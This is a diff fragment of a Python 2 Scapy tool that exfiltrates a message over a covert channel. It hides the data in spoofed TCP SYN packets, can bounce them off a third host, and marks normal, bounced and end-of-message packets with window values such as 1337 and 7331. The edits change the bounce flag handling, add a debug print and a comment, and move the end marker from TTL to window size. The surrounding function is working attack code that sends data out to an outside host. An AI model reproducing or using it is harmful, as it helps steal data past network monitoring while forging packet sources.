@@ -99,9 +99,9 @@ def exfil_iseq(spoof, destination, dstport, message, bounce):
     """
     i = 0
     exfilMsg = convert_iseq(message)
-    # if bounce == True then dst=spoof, src=destination, dport=80, sport=dstport
+    # if bounce == 1 then dst=spoof, src=destination, dport=80, sport=dstport
     # window = 1339 will indicate that this is a bounced packet
-    if bounce == True:
+    if bounce == 1:
         pkt = IP(src=destination, dst=spoof) / TCP(sport=dstport, dport=80, flags='S')
     else:
         pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
@@ -109,6 +109,8 @@ def exfil_iseq(spoof, destination, dstport, message, bounce):
     for c in exfilMsg:
         add_n0ise_iseq(pkt, exfilMsg[i])
         if bounce == 1:
+            # NOTE: we can't control the window size sent by the bounce host.
+            #       we need another indicator.
             pkt.window = 1339
         else:
             pkt.window = 1337
@@ -117,6 +119,7 @@ def exfil_iseq(spoof, destination, dstport, message, bounce):
         time.sleep(0.4)
         try:
             print '[window] ' + str(pkt.window)
+            print '[bounce] ' + str(bounce)
             send(pkt)
         except socket.error:
             print "\nERROR: Problem sending packets, are you root?\n"
@@ -146,8 +149,8 @@ def is_32bit(input_to_check):
 
 def send_eom(pkt):
     """
-    Send the last message, encoded with a special TTL to let the server know
-    we're done. Set the ttl=60 to indicate end-of-message
+    Send the last message, encoded with a special Window to let the server know
+    we're done. Set the window=7331 to indicate end-of-message
 
     Args:
         pkt (Packet): Scapy packet
